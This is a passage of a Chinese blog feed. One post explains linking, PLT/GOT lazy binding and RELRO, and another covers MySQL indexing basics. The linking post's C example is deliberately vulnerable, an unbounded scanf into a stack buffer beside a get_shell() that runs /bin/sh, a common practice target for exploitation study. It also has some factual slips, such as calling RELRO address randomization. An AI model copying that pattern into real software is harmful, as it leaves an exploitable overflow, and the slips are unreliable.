    <content type="html"><![CDATA[<h1 id="Windows-下-lib-dll-obj-exe"><a href="#Windows-下-lib-dll-obj-exe" class="headerlink" title="Windows 下.lib .dll .obj .exe"></a>Windows 下.lib .dll .obj .exe</h1><p>.lib 是静态链接文件</p><p>.dll 是动态链接文件</p><p>.obj 是编译时生成的中间代码文件，比如一个项目有多个.c 文件，编译时会先全部生成为中间 obj 文件，然后在进行链接生成最终的 exe 文件</p><p>.exe 文件是可执行文件</p><h1 id="Linux-下-o-so-a"><a href="#Linux-下-o-so-a" class="headerlink" title="Linux 下.o .so .a"></a>Linux 下.o .so .a</h1><p>.o 类似于 Windows 下的.obj 文件，是编译中间产物</p><p>.so 是动态链接文件</p><p>.a 是静态链接文件,可通过如下命令将中间文件加进 output.a 或者新生成一个 output.a</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">创建.a的命令</span><br><span class="line">ar rcx output.a test1.o test2.o</span><br></pre></td></tr></table></figure><h2 id="Linux-延迟绑定机制"><a href="#Linux-延迟绑定机制" class="headerlink" title="Linux 延迟绑定机制"></a>Linux 延迟绑定机制</h2><h3 id="使用的-C-语言例子"><a href="#使用的-C-语言例子" class="headerlink" title="使用的 C 语言例子"></a>使用的 C 语言例子</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//-------------------------------------------------------------------</span><br><span class="line">// FileName: test1.c</span><br><span class="line">// Author: hexuelin</span><br><span class="line">// Copyright (c) company***.</span><br><span class="line">//-------------------------------------------------------------------</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">void stack_overflow()&#123;</span><br><span class="line"> char buf[64] = &#123;0&#125;;</span><br><span class="line"> scanf(&quot;%s&quot;, &amp;buf);</span><br><span class="line"> printf(&quot;hello %s\n&quot;, &amp;buf);</span><br><span class="line">&#125;</span><br><span class="line">void get_shell()&#123;</span><br><span class="line"> system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char const *argv[])&#123;</span><br><span class="line"> stack_overflow();</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="静态链接和动态链接"><a href="#静态链接和动态链接" class="headerlink" title="静态链接和动态链接"></a>静态链接和动态链接</h2><p>静态链接在编译时把需要用到的内容都链接到文件中</p><p>动态链接则是会在程序执行时再进行链接</p><p>因此静态链接明显会比动态链接文件要大，同样的执行速度也会更快</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#编译时加上-static参数就是静态链接</span><br><span class="line">gcc title.c -o title_static -static</span><br><span class="line">#不加参数默认就是动态链接</span><br><span class="line">gcc title.c -o title</span><br></pre></td></tr></table></figure><p><img src="/blog_imgs/Linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/1744249758419-7eb479dc-c5a7-480c-b6c9-5e819fc619dc.png"></p><p><img src="/blog_imgs/Linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/1744249762197-97ee9ea1-40e2-4e94-9614-7c13c154a324.png"></p><h3 id="部分寄存器以及部分汇编指令"><a href="#部分寄存器以及部分汇编指令" class="headerlink" title="部分寄存器以及部分汇编指令"></a>部分寄存器以及部分汇编指令</h3><p>下面的汇编指令，部分用其他指令替代作为解释，但是实际上并不能用替代的指令，比如 rip,rsp 寄存器，原则上并不允许直接对他们进行操作</p><ul><li>rip</li></ul><p>指向下一条要执行的命令（还没有执行）</p><p>push 1</p><ul><li>rsp</li></ul><p>栈顶</p><ul><li>rbp</li></ul><p>栈底</p><ul><li>mov rax,1</li></ul><p>rax&#x3D;1</p><ul><li>add rax,1</li></ul><p>rax&#x3D;rax+1</p><ul><li>push rax</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add rsp,一个字长（64位一个字长就是64位，8字节）</span><br><span class="line">mov [rsp],rax</span><br></pre></td></tr></table></figure><ul><li>jmp 0x6666</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rip,0x6666</span><br></pre></td></tr></table></figure><ul><li>call printf<a href="/plt">@plt </a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#printf@plt是一个地址,这个地址的备注名叫做printf@plt</span><br><span class="line">push rip</span><br><span class="line">jmp printf@plt</span><br></pre></td></tr></table></figure><ul><li>leave</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rsp,rbp</span><br><span class="line">pop rbp</span><br></pre></td></tr></table></figure><ul><li>retn</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop rip</span><br></pre></td></tr></table></figure><h3 id="libc-so-6"><a href="#libc-so-6" class="headerlink" title="libc.so.6"></a>libc.so.6</h3><p>libc 是 Stantard C Library 的简称，它是符合 ANSI C 标准的一个标准函数库。</p><p>在 Linux 操作系统下所说的 libc 即 glibc。glibc 是类 Unix 操作系统中使用最广泛的 libc 库，它的全称是 GNU C Library.</p><h3 id="PLT-和-GOT"><a href="#PLT-和-GOT" class="headerlink" title="PLT 和 GOT"></a>PLT 和 GOT</h3><p><strong>PLT</strong>表称为过程链接表（procedure linkage table）</p><p><strong>GOT</strong>表称为全局偏移量表（global offset table）</p><p><strong>用不太严谨的话来概况，首先可以这么理解</strong>：</p><p><strong>GOT</strong>表中存储真正的函数地址</p><p><strong>PLT</strong>表中存储的是<strong>GOT</strong>表中的地址</p><p>调用函数时会先到PLT表，再由PLT表导向GOT表</p><p>**GOT[0]**包含.dynamic 段的地址，.dynamic 段包含了动态链接器用来绑定过程地址的信息，比如符号的位置和重定位信息</p><p>**GOT[1]**包含动态链接器的标识</p><p>**GOT[2]**包含动态链接器的延迟绑定代码的入口点，也就是调用_dl_runtime_resolve 函数，延迟绑定的时候要调用的函数</p><p>printf 第一次调用的时候 got 表中是没有实际地址的， 第一次调用 printf 的时候  ，最终会调用_dl_runtime_resolve 函数，这个函数的作用就是把 prtinf 函数的实际地址写入到 GOT 表中，之后如果第二次，第三次。。。调用 printf 的时候就能从 GOT 表直接获取到 printf 的地址了</p><p><strong>GOT</strong>表中正式的函数地址要从 GOT[3]开始，也就是第四项</p><p>举例：PLT 表中 printf<a href="/plt">@plt </a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jmp pr****@go***.plt</span><br><span class="line">push printf在got表中的编号</span><br><span class="line">jmp plt表第一行指令</span><br></pre></td></tr></table></figure><p>举例: GOT 表中 printf<a href="/got.plt">@got.plt </a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一次执行printf时：PLT表中printf@plt的第二行</span><br><span class="line">第二三四次执行printf时：动态链接库libc中函数printf的真实地址</span><br></pre></td></tr></table></figure><h3 id="延迟绑定机制下-函数初次调用流程图"><a href="#延迟绑定机制下-函数初次调用流程图" class="headerlink" title="延迟绑定机制下,函数初次调用流程图"></a>延迟绑定机制下,函数初次调用流程图</h3><p><img src="/blog_imgs/Linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/1744249859364-e8ace29f-3caf-46ab-b72d-b8a6a9abdab5.png"></p><h3 id="IDA-查看-PLT-表"><a href="#IDA-查看-PLT-表" class="headerlink" title="IDA 查看 PLT 表"></a>IDA 查看 PLT 表</h3><p><img src="/blog_imgs/Linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/1744249774986-45335481-e777-4191-9e00-c872f5da5f7a.png"></p><h3 id="IDA-查看-GOT-表"><a href="#IDA-查看-GOT-表" class="headerlink" title="IDA 查看 GOT 表"></a>IDA 查看 GOT 表</h3><p><img src="/blog_imgs/Linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/1744249779063-2d695725-69ae-4ddb-9ac7-3550bf6799f5.png"></p><h3 id="plt-got-got-plt"><a href="#plt-got-got-plt" class="headerlink" title=".plt     .got    .got.plt"></a>.plt     .got    .got.plt</h3><p>这三者是 ELF 文件格式中的节(section)</p><p>.plt 就是 PLT 表</p><p>.got 和.got.plt 统称为 GOT 表</p><p>.got 里面直接存储的就是函数调用的地址，部分函数地址是直接存放在.got 里面的</p><p>PLT 表指向的是.got.plt</p><p>printf@plt 指向的就是 pr****@go***.plt</p><p>第一次调用时<a href="mailto:&#x70;&#114;&#x69;&#x6e;&#116;&#102;&#64;&#103;&#111;&#x74;&#46;&#112;&#x6c;&#116;">printf@got.plt</a>里指向的是 printf@plt 的下一行也就是 push printf 对应的 got 表里的序号</p><p>放在.got 里的相当于.got.plt 第一次调用之后的状态</p><h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#关闭RELRO</span><br><span class="line">gcc title.c -o title_no -z norelro</span><br><span class="line">#部分开启RELRO(Partial RELRO不加参数默认是这个)</span><br><span class="line">gcc title.c -o title_partial -z lazy</span><br><span class="line">#完全开启RELRO(Full RELRO)</span><br><span class="line">gcc title.c -o title_full -z now</span><br></pre></td></tr></table></figure><ul><li>RELRO，<a href="https://so.csdn.net/so/search?q=%E5%A0%86%E6%A0%88&spm=1001.2101.3001.7020">堆栈</a>地址随机化， 是一种用于加强对 binary 数据段的保护的技术。</li><li>由于 GOT 和 PLT 以及延迟绑定的原因，在启用延迟绑定时，符号解析只发生在第一次使用的时候，该过程是通过 PLT 表进行的，解析完成后，相应的 GOT 条目会被修改为正确的函数地址。因此，在延迟绑定的情况下。.got.plt 必须可写，这就给了攻击者篡改地址劫持程序的执行的可能。</li><li>RELRO（ReLocation Read-Only）机制的提出就是为了解决延迟绑定的安全问题，他将符号重定位表设置为只读，或者在程序启动时就解析并绑定所有的动态符号，从而避免 GOT 上的地址被篡改。RELRO 有两种形式：<ul><li>partial RELRO：一些段（包括.dynamic,.got 等）在初始化后会被标记为只读。在 unbuntu16.04（GCC-5.4.0）上，默认开启 Partial RELRO。</li><li>Full RELRO ：除了 Partial RELRO，延迟绑定将被禁止，所有的导入符号将在开始时被解析，.got.plt 段会被完全初始化为目标函数的最终地址，并被 mprotect 标记为只读，但其实.got.plt 会被直接合并到.got，也就看不到这段了。另外 link_map 和_dl_runtime_reolve 的地址也不会被装入。开启 Full RELRO 会对程序启动时的性能造成一定的影响，但也只有这样才能防止攻击者篡改 GOT。</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Windows-下-lib-dll-obj-exe&quot;&gt;&lt;a href=&quot;#Windows-下-lib-dll-obj-exe&quot; class=&quot;headerlink&quot; title=&quot;Windows 下.lib .dll .obj .exe&quot;&gt;&lt;/a&gt;Windows </summary>
      
    
    
    
    
    <category term="Linux" scheme="https://lyi61pd.github.io/tags/Linux/"/>
    
    <category term="二进制" scheme="https://lyi61pd.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>Mysql</title>
    <link href="https://lyi61pd.github.io/2025/04/10/Mysql/"/>
    <id>https://lyi61pd.github.io/2025/04/10/Mysql/</id>
    <published>2025-04-10T00:00:00.000Z</published>
    <updated>2025-07-30T03:40:55.100Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Mysql基础"><a href="#Mysql基础" class="headerlink" title="Mysql基础"></a>Mysql基础</h1><p>MySQL 是一个开源的关系型数据库管理系统，说白了就是可以用它来存储、查询和管理数据。比如写个网站，有用户、有商品、有订单，这些数据全都可以塞进 MySQL 里。</p><p>它属于 “关系型” 的那种数据库，意思就是数据是按表格来组织的（跟 Excel 差不多的感觉），表和表之间可以建立关系。</p><p>MySQL 的流行程度非常高，从小公司到大厂基本都会用，生态也非常完善。</p><h2 id="MySQL-和其他数据库有什么不同？"><a href="#MySQL-和其他数据库有什么不同？" class="headerlink" title="MySQL 和其他数据库有什么不同？"></a>MySQL 和其他数据库有什么不同？</h2><ul><li>MySQL 是开源的，可以免费用</li><li>跟 PostgreSQL 比，它性能高点但功能稍少</li><li>跟 Oracle 或 SQL Server 比，它更轻量、容易上手</li></ul><h2 id="数据库的基本概念"><a href="#数据库的基本概念" class="headerlink" title="数据库的基本概念"></a>数据库的基本概念</h2><p>用 MySQL 最常打交道的几个东西：</p><ul><li>数据库（Database）：相当于一个文件夹，里面放表</li><li>表（Table）：一张张结构化的表格</li><li>行（Row）：每条数据就像表格的一行</li><li>列（Column）：表格的一列，也就是字段</li><li>主键（Primary Key）：每一行的唯一标识，比如 id</li><li>索引（Index）：加速查询用的，就像书的目录</li><li>视图（View）：虚拟表，本质是个查询的结果</li><li>存储过程、触发器等：偏后面点的高级操作，可以之后再学</li></ul><h2 id="MySQL-区分大小写吗？"><a href="#MySQL-区分大小写吗？" class="headerlink" title="MySQL 区分大小写吗？"></a>MySQL 区分大小写吗？</h2><ul><li>表名是否区分大小写，跟系统有关。Linux 下区分，Windows 下不区分。</li><li>字段名一般不区分。</li><li>字段里的值是否区分大小写，取决于字符集和排序规则（collation）。</li></ul><h2 id="怎么创建数据库和表？"><a href="#怎么创建数据库和表？" class="headerlink" title="怎么创建数据库和表？"></a>怎么创建数据库和表？</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE myapp;</span><br><span class="line"></span><br><span class="line">USE myapp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE TABLE</span> users (</span><br><span class="line">  id <span class="type">INT</span> <span class="keyword">PRIMARY KEY</span> AUTO_INCREMENT,</span><br><span class="line">  name <span class="type">VARCHAR</span>(<span class="number">100</span>),</span><br><span class="line">  age <span class="type">INT</span>,</span><br><span class="line">  created_at DATETIME</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>这段 SQL 创建了一个名为 <code>myapp</code> 的数据库，以及一张 <code>users</code> 表。字段里 <code>AUTO_INCREMENT</code> 是自增主键，常见套路。</p><h2 id="数据类型该怎么选？"><a href="#数据类型该怎么选？" class="headerlink" title="数据类型该怎么选？"></a>数据类型该怎么选？</h2><ul><li>整数：<code>INT</code>、<code>BIGINT</code>（根据范围选）</li><li>字符串：<code>VARCHAR</code>（变长）、<code>CHAR</code>（定长）</li><li>文本：<code>TEXT</code>，但不能做索引</li><li>时间：<code>DATETIME</code>、<code>TIMESTAMP</code></li><li>布尔值：没有 <code>BOOLEAN</code>，用 <code>TINYINT(1)</code> 模拟</li></ul><p>选类型的时候，别盲目追求“大”，越精确越节省空间和性能。</p><hr><h1 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h1><p>简单说，索引就是数据库用来加快查找速度的一个“加速器”。就像看书有目录，你不会每次都从头翻，只要查一下页码就能直接跳过去。</p><p>在 MySQL 中，如果没有索引，数据库每次查数据都要从头到尾一条条扫，叫做 <strong>全表扫描</strong>，当数据多了之后，这种查询会非常慢。</p><h2 id="为什么需要索引"><a href="#为什么需要索引" class="headerlink" title="为什么需要索引"></a>为什么需要索引</h2><p>想象你有一张表，几百万条记录，你想查 “名字叫小明的人”，没有索引的话，MySQL 会很累，要一条条看过去。加了索引之后，就可以直接跳到“名字 &#x3D; 小明”的那几条记录。</p><p>所以，索引主要解决的问题就是：</p><ul><li>加快查询速度（读得快）</li><li>排序、分组也能更高效</li><li>可以帮助做唯一性约束（比如用户名不能重复）</li></ul><h2 id="加了索引，是不是越多越好"><a href="#加了索引，是不是越多越好" class="headerlink" title="加了索引，是不是越多越好"></a>加了索引，是不是越多越好</h2><p>不是的，索引不是白送的，它有代价：</p><ul><li>会占用额外的磁盘空间</li><li>写入、更新会变慢，因为要同步更新索引</li><li>索引太多反而可能让查询优化器懵逼，不知道该用哪个</li></ul><p>所以得有选择性地加，不能一上来就 “全字段都加个索引试试”。</p><h2 id="MySQL-的索引底层怎么实现"><a href="#MySQL-的索引底层怎么实现" class="headerlink" title="MySQL 的索引底层怎么实现"></a>MySQL 的索引底层怎么实现</h2><p>MySQL 默认用的是 <strong>B+ 树索引</strong>。这是种多路平衡查找树，跟普通的二叉树不一样，B+ 树每个节点可以有很多个子节点，并且所有数据都在“叶子节点”。</p><p>优点是：</p><ul><li>查询次数少，磁盘 IO 少</li><li>顺序读取也快，适合做范围查询</li></ul><p>另外还有一种 <strong>哈希索引</strong>，但它只能用于等值查找，不支持范围查找，MyISAM 不支持，InnoDB 默认也不用。</p><h2 id="索引的几种类型"><a href="#索引的几种类型" class="headerlink" title="索引的几种类型"></a>索引的几种类型</h2><h3 id="主键索引（Primary-Key）"><a href="#主键索引（Primary-Key）" class="headerlink" title="主键索引（Primary Key）"></a>主键索引（Primary Key）</h3><ul><li>表里只能有一个</li><li>自动加索引</li><li>InnoDB 下是聚簇索引（数据和索引放一起）</li></ul><h3 id="唯一索引（Unique-Index）"><a href="#唯一索引（Unique-Index）" class="headerlink" title="唯一索引（Unique Index）"></a>唯一索引（Unique Index）</h3><ul><li>限制某字段不能重复，比如邮箱、用户名等</li><li>和主键差不多，但可以有多个</li></ul><h3 id="普通索引（Index）"><a href="#普通索引（Index）" class="headerlink" title="普通索引（Index）"></a>普通索引（Index）</h3><ul><li>没有限制，只是为了加速查询</li></ul><h3 id="组合索引（联合索引）"><a href="#组合索引（联合索引）" class="headerlink" title="组合索引（联合索引）"></a>组合索引（联合索引）</h3><ul><li>一次索引多个字段，比如 <code>(name, age)</code></li><li>遵循“最左前缀”原则，查询要从最左边字段开始才有效</li></ul><h3 id="全文索引（Fulltext）"><a href="#全文索引（Fulltext）" class="headerlink" title="全文索引（Fulltext）"></a>全文索引（Fulltext）</h3><ul><li>用来做全文搜索（比如查一段文字里有没有某个词）</li><li>MySQL 5.6 后支持 InnoDB，但功能比不上专业的全文检索引擎（比如 Elasticsearch）</li></ul><h2 id="聚簇索引和非聚簇索引区别在哪"><a href="#聚簇索引和非聚簇索引区别在哪" class="headerlink" title="聚簇索引和非聚簇索引区别在哪"></a>聚簇索引和非聚簇索引区别在哪</h2><ul><li>聚簇索引：数据和索引放一起（InnoDB 的主键索引），B+树的叶子节点放数据</li><li>非聚簇索引：索引里存的是主键的值，查的时候需要回表，<code>create index</code> 创建的是非聚簇索引，它为表中某个或多个列提供了独立的索引结构，不改变数据的物理存储顺序</li></ul><p>比如你查 <code>name</code>，但主键是 <code>id</code>，那先查到 <code>id</code>，然后再去表里拿其他字段，叫做 <strong>回表</strong>。所以非聚簇索引比聚簇的多一步操作。</p><h2 id="索引应该怎么加"><a href="#索引应该怎么加" class="headerlink" title="索引应该怎么加"></a>索引应该怎么加</h2><p>几个常见的加法操作：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 创建索引</span></span><br><span class="line"><span class="keyword">CREATE</span> INDEX idx_name <span class="keyword">ON</span> users(name);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建组合索引</span></span><br><span class="line"><span class="keyword">CREATE</span> INDEX idx_name_age <span class="keyword">ON</span> users(name, age);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除索引</span></span><br><span class="line"><span class="keyword">DROP</span> INDEX idx_name <span class="keyword">ON</span> users;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建唯一索引</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">UNIQUE</span> INDEX idx_email <span class="keyword">ON</span> users(email);</span><br></pre></td></tr></table></figure><h2 id="加索引的最佳实践"><a href="#加索引的最佳实践" class="headerlink" title="加索引的最佳实践"></a>加索引的最佳实践</h2><ul><li>经常出现在 <code>WHERE</code>、<code>ORDER BY</code>、<code>GROUP BY</code>、<code>JOIN</code> 里的字段可以考虑加索引</li><li>不要给频繁更新的字段加索引，会拖慢写入</li><li>字段的区分度要高（重复值越少越好），不然索引效果很差</li><li>索引字段顺序很重要，组合索引得用对“最左前缀”原则</li><li>大字段（比如 TEXT、BLOB）不要加索引</li></ul><h2 id="为什么加了索引却没生效？"><a href="#为什么加了索引却没生效？" class="headerlink" title="为什么加了索引却没生效？"></a>为什么加了索引却没生效？</h2><ul><li>查询条件没用到最左前缀</li><li>用了函数包裹字段，比如 <code>WHERE UPPER(name) = &#39;TOM&#39;</code></li><li>数据太少，MySQL 判断不用索引更快</li><li>查询用到了模糊匹配开头，比如 <code>LIKE &#39;%abc&#39;</code>，这种索引就用不上</li></ul><p>可以用 <code>EXPLAIN</code> 看看查询计划，判断是不是用了索引。</p><h2 id="稀疏索引（Sparse-Index）"><a href="#稀疏索引（Sparse-Index）" class="headerlink" title="稀疏索引（Sparse Index）"></a>稀疏索引（Sparse Index）</h2><p><strong>稀疏索引</strong> 是一种索引类型，其中并不是对每一行数据都建立索引，而是仅对数据块或数据页中的部分行建立索引。具体来说，它在数据表中的每一页（或某些范围）选择一小部分数据作为索引项，从而减少了存储空间和维护开销。**稀疏索引 **是clickhouse使用的索引，不是MySQL。ClickHouse <strong>不支持传统的索引</strong>（如 B-tree 和哈希索引），但通过使用 <strong>主键排序</strong> 和 <strong>稀疏索引</strong>，ClickHouse 实现了基于列存储的数据优化。</p><h3 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h3><ul><li><strong>节省存储空间</strong>：不像传统索引那样对每一行数据都建立索引，因此占用的存储空间较少。</li><li><strong>查询效率较低</strong>：虽然存储空间小，但查找时需要跳过一部分无关数据，因此查询效率通常比完整索引低。</li><li><strong>常用于大数据量的表</strong>：适用于大数据量的表，尤其在需要快速定位某些数据范围时，例如大规模的日志文件或时序数据。</li></ul><h3 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h3><p>假设你有一个大的表，而这个表有 100 万行数据。通过稀疏索引，你可能只会对每 1000 行数据建立一个索引，而不是为每一行数据建立索引。这样，查询时，索引会帮助你找到大致的位置，但仍然需要检查一些数据块中的具体内容。</p><hr><h2 id="倒排索引（Inverted-Index）"><a href="#倒排索引（Inverted-Index）" class="headerlink" title="倒排索引（Inverted Index）"></a>倒排索引（Inverted Index）</h2><p><strong>倒排索引</strong> 常见于全文搜索引擎或文档检索系统。它的基本思想是：给定一个文本字段，倒排索引记录该字段中每个单词（或词条）出现的位置。倒排索引把文档或记录中的词汇与它们出现的具体位置关联起来，从而能在搜索时快速定位相关文档或记录。倒排索引是一种数据结构。</p><h3 id="特点：-1"><a href="#特点：-1" class="headerlink" title="特点："></a>特点：</h3><ul><li><strong>文本搜索优化</strong>：倒排索引特别适用于文本或字符类型字段的搜索（例如搜索引擎中的关键词搜索）。</li><li><strong>建立索引时需要分词</strong>：每个单词、词条或者关键词都会被拆分成单独的项进行索引。</li><li><strong>支持快速全文检索</strong>：可以快速查找一个特定单词在哪些文档中出现，并返回这些文档的 ID 或位置。</li></ul><h3 id="举例：-1"><a href="#举例：-1" class="headerlink" title="举例："></a>举例：</h3><p>假设你有一组文档：</p><ol><li>“the cat”</li><li>“the dog”</li><li>“cat and dog”</li></ol><p>倒排索引会如下记录：</p><ul><li><strong>cat</strong> -&gt; [1, 3]</li><li><strong>dog</strong> -&gt; [2, 3]</li><li><strong>the</strong> -&gt; [1, 2, 3]</li><li><strong>and</strong> -&gt; [3]</li></ul><p>这样，当你查询 “cat” 时，倒排索引会迅速告诉你，”cat” 出现在文档 1 和文档 3 中。</p><hr><h2 id="全文索引（Full-Text-Index）"><a href="#全文索引（Full-Text-Index）" class="headerlink" title="全文索引（Full-Text Index）"></a>全文索引（Full-Text Index）</h2><p><strong>全文索引</strong> 是一种针对文本数据字段的特殊索引类型，用于加速基于文本内容的查询（如关键字搜索）。它基于倒排索引原理，主要用于支持高效的文本检索。通常，全文索引会对文本内容进行分词处理，将文本拆分成单个的词条，并为每个词条建立索引。</p><p><strong>全文索引</strong> 和 <strong>倒排索引</strong> 在概念上是相关的，但它们并不是完全一样的东西。实际上，<strong>全文索引</strong> 通常是基于 <strong>倒排索引</strong> 实现的。可以说，**倒排索引 **是实现 <strong>全文索引 <strong>的一种常见方式。<strong>全文索引</strong>通常使用</strong>倒排索引</strong>作为底层数据结构。<strong>倒排索引 <strong>提供了高效的查找能力，使得</strong>全文索引</strong>可以快速响应基于单词的查询。**全文索引 **不仅仅是倒排索引，它还包括了对文本的分词、停用词（如 “the”、”a” 等不重要的词）的过滤、词干提取（例如将 “running” 归一化为 “run”）以及复杂查询的支持等。这些操作使得全文索引比简单的倒排索引更加复杂。</p><h3 id="特点：-2"><a href="#特点：-2" class="headerlink" title="特点："></a>特点：</h3><ul><li><strong>适用于大文本数据</strong>：全文索引广泛用于大型文本数据的搜索，如博客、评论、文章、文档等。</li><li><strong>支持复杂的文本查询</strong>：不仅支持精确匹配，还支持模糊查询、词频查询、近似匹配等复杂搜索方式。</li><li><strong>需要额外的存储和处理开销</strong>：由于需要对文本进行分词处理、存储词频等信息，全文索引会比传统索引占用更多的存储空间。</li></ul><h3 id="举例：-2"><a href="#举例：-2" class="headerlink" title="举例："></a>举例：</h3><p>例如，假设你对包含文章内容的数据库字段创建了全文索引，查询 <code>dog</code> 时，可以返回所有包含单词 “dog” 的文章，不仅是精确匹配，还可能包括包含类似词的结果，如 “dogs” 或 “dogged”。</p><hr><h2 id="覆盖索引-Covering-Index"><a href="#覆盖索引-Covering-Index" class="headerlink" title="覆盖索引 (Covering Index)"></a>覆盖索引 (Covering Index)</h2><p><strong>覆盖索引</strong> 是指索引包含了查询所需的所有列的数据。也就是说，在查询过程中，MySQL 可以直接从索引中获取结果，而不需要访问实际的数据表。通过使用覆盖索引，MySQL 可以避免“回表”操作（即去访问数据表），从而提高查询效率。</p><p><strong>什么情况下使用覆盖索引</strong></p><ul><li>查询的所有列（包括 <code>SELECT</code> 字段、<code>WHERE</code> 子句中的过滤条件、<code>ORDER BY</code> 子句等）都包含在索引中。</li><li>这种情况下，查询会直接从索引中获取结果，避免了扫描数据表的过程。</li></ul><hr><h2 id="最左前缀原则"><a href="#最左前缀原则" class="headerlink" title="最左前缀原则"></a>最左前缀原则</h2><p><strong>最左前缀原则</strong>（<strong>Leftmost Prefix Principle</strong>）是关系型数据库中索引的一个重要概念，尤其是在 <strong>复合索引</strong>（multi-column index）中。它指的是，在使用复合索引时，查询条件必须匹配索引的<strong>最左部分</strong>，即从复合索引的最左侧开始的列，才能充分利用复合索引。</p><h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><p>在Mysql的InnoDB引擎中，默认索引用的是B+树，因为 B+ 树是一个<strong>从根到叶子是有序搜索路径</strong>，如果<strong>不从最左边字段开始搜索，就无法走索引路径</strong>。</p><p>在 MySQL 中，当创建一个复合索引（一个包含多个列的索引）时，这个索引是基于列的顺序来组织的。<strong>最左前缀原则</strong>要求，查询条件必须按照索引中列的顺序，至少使用索引的最左边的部分，才能有效地利用该复合索引。</p><h3 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h3><ul><li><strong>最左前缀原则</strong>意味着查询中的 <code>WHERE</code> 子句，应该从复合索引的最左边的列开始依次使用。如果某个查询条件没有匹配索引的最左边的列或部分列，MySQL 就不能完全利用这个复合索引。</li><li>换句话说，复合索引的使用是按顺序的，查询条件需要依次包含索引中的列。</li></ul><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>假设你有以下复合索引：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> INDEX idx_name <span class="keyword">ON</span> employees (last_name, first_name, hire_date);</span><br></pre></td></tr></table></figure><p>这个索引是针对 <code>last_name</code>、<code>first_name</code> 和 <code>hire_date</code> 列创建的。根据 <strong>最左前缀原则</strong>，这个索引可以在以下查询中有效：</p><ol><li><strong>完全匹配最左前缀</strong>：</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employees <span class="keyword">WHERE</span> last_name <span class="operator">=</span> <span class="string">&#x27;Smith&#x27;</span> <span class="keyword">AND</span> first_name <span class="operator">=</span> <span 